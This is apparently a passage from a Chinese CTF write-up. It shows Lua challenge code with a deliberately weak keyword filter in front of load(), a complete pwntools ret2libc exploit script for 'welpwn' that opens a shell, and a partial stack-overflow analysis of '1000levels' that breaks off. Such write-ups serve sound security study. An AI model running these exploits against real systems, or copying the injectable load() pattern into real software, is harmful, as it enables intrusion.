<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- http://www.playwithlua.com/?p=28</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_board</span><span class="params">(size)</span></span></span><br><span class="line">   <span class="keyword">local</span> board = &#123; size = size &#125;</span><br><span class="line">   <span class="built_in">setmetatable</span>(board, &#123; <span class="built_in">__tostring</span> = board_tostring &#125;)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> n = <span class="number">0</span>, size * size - <span class="number">1</span> <span class="keyword">do</span></span><br><span class="line">      board[n] = <span class="number">0</span></span><br><span class="line">   <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> board</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">populate_board</span><span class="params">(board, filled, seed)</span></span></span><br><span class="line">   <span class="keyword">local</span> size = board.size</span><br><span class="line">   <span class="keyword">if</span> seed <span class="keyword">then</span> <span class="built_in">math</span>.<span class="built_in">randomseed</span>(seed) <span class="keyword">end</span></span><br><span class="line">   filled = filled <span class="keyword">or</span> size * size * <span class="number">3</span> / <span class="number">4</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">rand</span><span class="params">()</span></span></span><br><span class="line">      <span class="keyword">local</span> c</span><br><span class="line">      <span class="keyword">repeat</span> c = <span class="built_in">math</span>.<span class="built_in">random</span>(size * size) - <span class="number">1</span> <span class="keyword">until</span> board[c] == <span class="number">0</span></span><br><span class="line">      <span class="keyword">return</span> c</span><br><span class="line">   <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> filled &gt; <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">      <span class="keyword">for</span> _,v <span class="keyword">in</span> <span class="built_in">ipairs</span>&#123;<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>&#125; <span class="keyword">do</span> board[rand()] = v <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> n = <span class="number">1</span>, filled<span class="number">-4</span> <span class="keyword">do</span></span><br><span class="line">         board[rand()] = <span class="built_in">math</span>.<span class="built_in">random</span>(<span class="number">4</span>)</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> fall(board)</span><br><span class="line">   <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">board_tostring</span><span class="params">(board)</span></span></span><br><span class="line">   <span class="keyword">local</span> <span class="built_in">lines</span> = &#123;&#125;</span><br><span class="line">   <span class="keyword">local</span> size = board.size</span><br><span class="line">   <span class="keyword">for</span> y = <span class="number">0</span>, size - <span class="number">1</span> <span class="keyword">do</span></span><br><span class="line">      <span class="keyword">local</span> line = <span class="string">"|"</span></span><br><span class="line">      <span class="keyword">for</span> x = <span class="number">0</span>, size - <span class="number">1</span> <span class="keyword">do</span></span><br><span class="line">         line = line .. <span class="string">" "</span> .. board[x+y*size]</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">      <span class="built_in">table</span>.<span class="built_in">insert</span>(<span class="built_in">lines</span>, line .. <span class="string">" |"</span>)</span><br><span class="line">   <span class="keyword">end</span></span><br><span class="line">   <span class="keyword">return</span> <span class="built_in">table</span>.<span class="built_in">concat</span>(<span class="built_in">lines</span>,<span class="string">"\n"</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fall</span><span class="params">(board)</span></span></span><br><span class="line">   <span class="keyword">local</span> size = board.size</span><br><span class="line">   <span class="keyword">local</span> new_board = make_board(size, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">fall_column</span><span class="params">(col)</span></span></span><br><span class="line">      <span class="keyword">local</span> dest = size - <span class="number">1</span></span><br><span class="line">      <span class="keyword">for</span> y = size<span class="number">-1</span>, <span class="number">0</span>, <span class="number">-1</span> <span class="keyword">do</span></span><br><span class="line">         <span class="keyword">if</span> board[y*size + col] ~= <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">            new_board[dest*size + col] = board[y*size + col]</span><br><span class="line">            dest = dest - <span class="number">1</span></span><br><span class="line">         <span class="keyword">end</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">   <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> x=<span class="number">0</span>, size<span class="number">-1</span> <span class="keyword">do</span></span><br><span class="line">      fall_column(x)</span><br><span class="line">   <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> new_board</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rotate</span><span class="params">(board)</span></span></span><br><span class="line">   <span class="keyword">local</span> size = board.size</span><br><span class="line">   <span class="keyword">local</span> new_board = make_board(size, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> y = <span class="number">0</span>, size<span class="number">-1</span> <span class="keyword">do</span></span><br><span class="line">      <span class="keyword">local</span> dest_col = size - <span class="number">1</span> - y</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> n = <span class="number">0</span>, size<span class="number">-1</span> <span class="keyword">do</span></span><br><span class="line">         new_board[n*size + dest_col] = board[y*size + n]</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">   <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> new_board</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">crush</span><span class="params">(board)</span></span></span><br><span class="line">   <span class="keyword">local</span> size = board.size</span><br><span class="line">   <span class="keyword">local</span> new_board = make_board(size, <span class="number">0</span>)</span><br><span class="line">   <span class="keyword">local</span> crushers = &#123;<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>&#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> n=<span class="number">0</span>, size<span class="number">-1</span> <span class="keyword">do</span></span><br><span class="line">      new_board[n] = board[n]</span><br><span class="line">   <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> n = size, size*size - <span class="number">1</span> <span class="keyword">do</span></span><br><span class="line">      <span class="keyword">if</span> board[n-size] == crushers[board[n]] <span class="keyword">then</span></span><br><span class="line">         new_board[n] = <span class="number">0</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">         new_board[n] = board[n]</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">   <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> new_board</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rotate_left</span><span class="params">(board)</span></span></span><br><span class="line">   <span class="keyword">return</span> rotate(rotate(rotate(board)))</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readAll</span><span class="params">(file)</span></span></span><br><span class="line">    <span class="keyword">local</span> f = <span class="built_in">io</span>.<span class="built_in">open</span>(file, <span class="string">"rb"</span>)</span><br><span class="line">    <span class="keyword">local</span> content = f:<span class="built_in">read</span>(<span class="string">"*all"</span>)</span><br><span class="line">    f:<span class="built_in">close</span>()</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">help</span><span class="params">()</span></span></span><br><span class="line">	<span class="keyword">local</span> l = <span class="built_in">string</span>.<span class="built_in">sub</span>(readAll(<span class="string">"server.luac"</span>), <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">	writeraw(l, <span class="built_in">string</span>.<span class="built_in">len</span>(l))</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">quit = <span class="literal">false</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">exit</span><span class="params">()</span></span></span><br><span class="line">	quit = <span class="literal">true</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">run_step</span><span class="params">(board)</span></span></span><br><span class="line">   <span class="keyword">local</span> cmd = readline()</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(<span class="built_in">string</span>.<span class="built_in">len</span>(cmd) == <span class="number">0</span>) <span class="keyword">then</span></span><br><span class="line">   	 <span class="built_in">exit</span>()</span><br><span class="line">   	 <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">   <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">-- prevent injection attacks</span></span><br><span class="line">   <span class="keyword">if</span>(<span class="built_in">string</span>.<span class="built_in">find</span>(cmd, <span class="string">"function"</span>)) <span class="keyword">then</span></span><br><span class="line">   	 <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">   <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(<span class="built_in">string</span>.<span class="built_in">find</span>(cmd, <span class="string">"print"</span>)) <span class="keyword">then</span></span><br><span class="line">   	 <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">   <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">local</span> f = <span class="built_in">load</span>(<span class="string">"return "</span> .. cmd)()</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> f == <span class="literal">nil</span> <span class="keyword">then</span></span><br><span class="line">   	 <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">   <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> f(board)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">game</span><span class="params">()</span></span></span><br><span class="line">   <span class="keyword">local</span> board = populate_board(make_board(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">   <span class="keyword">repeat</span></span><br><span class="line">      </span><br><span class="line">      writeline(board_tostring(board) .. <span class="string">"\n"</span>)</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">local</span> b = run_step(board)</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> quit <span class="keyword">then</span></span><br><span class="line">      	<span class="keyword">break</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> b ~= <span class="literal">nil</span> <span class="keyword">then</span></span><br><span class="line">      	 board = b</span><br><span class="line">         board = fall(crush(fall(board)))</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">         writeline(<span class="string">"Didn't understand. Type 'rotate', 'rotate_left', 'exit', or 'help'.\n"</span>)</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">until</span> <span class="literal">false</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">writeline(<span class="string">"let's play a game\n"</span>)</span><br><span class="line"></span><br><span class="line">game()</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="Flag-2"><a href="#Flag-2" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">动态靶机</span><br></pre></td></tr></table></figure>

<h2 id="welpwn"><a href="#welpwn" class="headerlink" title="welpwn"></a>welpwn</h2><h3 id="Description-3"><a href="#Description-3" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
<p>暂无</p>
</blockquote>
<hr>
<h3 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution:"></a>Solution:</h3><p>这题主要是因为 echo 函数有个<code>\x00</code>截断导致程序无法正常布置 payload</p>
<p>但是一开始 main 函数里面是用 read 函数读取的字符串，所以没有截断</p>
<p>用 gdb 查看栈空间发现 echo 的 ret 地址距离我们在 main 函数里正常布置的 payload 相差了<code>0x28</code>，如下：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack <span class="number">40</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ <span class="built_in">rsp</span>  <span class="number">0x7ffffa5f1548</span> → <span class="number">0x40089c</span> (__libc_csu_init+<span class="number">92</span>) ← <span class="keyword">pop</span>    <span class="built_in">r12</span>(<span class="keyword">ret</span>)</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7ffffa5f1550</span> ← <span class="number">0x6161616161616161</span> (<span class="string">'aaaaaaaa'</span>)</span><br><span class="line">... ↓</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7ffffa5f1568</span> → <span class="number">0x40089c</span> (__libc_csu_init+<span class="number">92</span>) ← <span class="keyword">pop</span>    <span class="built_in">r12</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│      <span class="number">0x7ffffa5f1570</span> → <span class="number">0x4008a3</span> (__libc_csu_init+<span class="number">99</span>) ← <span class="keyword">pop</span>    <span class="built_in">rdi</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0x7ffffa5f1578</span> → <span class="number">0x601018</span> (puts@got.plt) → <span class="number">0x4005a6</span> (puts@plt+<span class="number">6</span>) ← <span class="keyword">push</span>   <span class="number">0</span> /* <span class="string">'h'</span> */</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7ffffa5f1580</span> → <span class="number">0x40059c</span> ← <span class="keyword">nop</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rax</span>]</span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│      <span class="number">0x7ffffa5f1588</span> → <span class="number">0x4007cd</span> (main) ← <span class="keyword">push</span>   <span class="built_in">rbp</span></span><br></pre></td></tr></table></figure>

<p>所以我们可以用 pop 来改变 rsp 的高度，pop 一次可以使 rsp + 8，所以这里我们需要 pop 4 次(因为 ret 也会使 rsp + 8)</p>
<p>找有四个 pop 的地址作为铺垫，后面就是 ret2libc，随便做了</p>
<p><strong>exp如下：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">context(log_level=<span class="string">"debug"</span>, arch=<span class="string">"amd64"</span>, os=<span class="string">"linux"</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    p = process(<span class="string">'./welpwn'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'111.198.29.45'</span>, <span class="number">45261</span>)</span><br><span class="line">elf = ELF(<span class="string">'./welpwn'</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">got_puts = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">plt_puts = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">addr_rdi_ret = <span class="number">0x4008a3</span></span><br><span class="line">addr_r12_r13_r14_r15_ret = <span class="number">0x40089c</span></span><br><span class="line">addr_main = <span class="number">0x4007CD</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p, "b *0x4007cb\nc")</span></span><br><span class="line">pd = <span class="string">'a'</span> * <span class="number">0x18</span></span><br><span class="line">pd += p64(addr_r12_r13_r14_r15_ret)</span><br><span class="line">pd += p64(addr_rdi_ret)</span><br><span class="line">pd += p64(got_puts)</span><br><span class="line">pd += p64(plt_puts)</span><br><span class="line">pd += p64(addr_main)</span><br><span class="line">p.sendafter(<span class="string">'Welcome to RCTF\n'</span>, pd)</span><br><span class="line">p.recvuntil(<span class="string">'\x9c\x08\x40'</span>)</span><br><span class="line"></span><br><span class="line">addr_puts = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>, addr_puts)</span><br><span class="line">libcbase = addr_puts - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">addr_system = libcbase + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">addr_bin_sh = libcbase + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line">pd = <span class="string">'a'</span> * <span class="number">0x18</span></span><br><span class="line">pd += p64(addr_r12_r13_r14_r15_ret)</span><br><span class="line">pd += p64(addr_rdi_ret)</span><br><span class="line">pd += p64(addr_bin_sh)</span><br><span class="line">pd += p64(addr_system)</span><br><span class="line">pd += p64(addr_main)</span><br><span class="line">p.sendafter(<span class="string">'Welcome to RCTF\n'</span>, pd)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="Flag-3"><a href="#Flag-3" class="headerlink" title="Flag:"></a>Flag:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">动态靶机</span><br></pre></td></tr></table></figure>

<h2 id="1000levevls"><a href="#1000levevls" class="headerlink" title="1000levevls"></a>1000levevls</h2><h3 id="Description-4"><a href="#Description-4" class="headerlink" title="Description:"></a>Description:</h3><blockquote>
<p>暂无</p>
</blockquote>
<hr>
<h3 id="Solution-4"><a href="#Solution-4" class="headerlink" title="Solution:"></a>Solution:</h3><p>写个详解，拿到题目找漏洞，可以在<code>sub_E43</code>函数中找到这样一个栈溢出漏洞</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __<span class="function">fastcall <span class="title">sub_E43</span><span class="params">(<span class="keyword">signed</span> <span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 buf; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// [rsp+34h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v9; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v10; <span class="comment">// [rsp+3Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  buf = <span class="number">0L</span>L;</span><br><span class="line">  v5 = <span class="number">0L</span>L;</span><br><span class="line">  v6 = <span class="number">0L</span>L;</span><br><span class="line">  v7 = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( !a1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( sub_E43((a1 - <span class="number">1</span>)) == <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  v10 = rand() % a1;</span><br><span class="line">  v2 = rand();</span><br><span class="line">  v9 = v2 % a1;</span><br><span class="line">  v8 = v2 % a1 * v10;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"===================================================="</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Level %d\n"</span>, a1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Question: %d * %d = ? Answer:"</span>, v10, v9);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x400</span>uLL);</span><br><span class="line">  v3 = strtol(&amp;buf, <span class="number">0L</span>L, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">return</span> v3 == v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里<code>read</code>能读 0x400 的数据，而 buf 只需要 0x38 个垃圾数据即可覆盖到 ret</p>
<p>这个函数是个递归函数，在递归过程中，rsp 会不断减小，所以我们不能在递归过程中利用溢出</p>
<p>看看程序开了什么保护机制</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@lepPwn:~/CTF/Pwn<span class="comment"># checksec 100levels</span></span><br><span class="line">[*] <span class="string">'/root/CTF/Pwn/100levels'</span></span><br><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<p>可以看到开启了 PIE ，那么现在的首要问题就是如何才能得到正确的函数地址</p>
<p>在 hint 对应的<code>sub_D06</code>函数中我们可以找到答案</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_D06</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-108h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+10h] [rbp-100h]</span></span><br><span class="line">  __int16 v3; <span class="comment">// [rsp+14h] [rbp-FCh]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( unk_20208C )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sprintf</span>(&amp;v1, <span class="string">"Hint: %p\n"</span>, &amp;system, &amp;system);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = 'N NWP ON';</span><br><span class="line">    v2 = 'UF O';</span><br><span class="line">    v3 = <span class="string">'N'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(&amp;v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是我们没有任何手段能够使<code>unk_20208C</code>上面的值变成 1，这时候在汇编里我们可以看到真正的 hint</p>
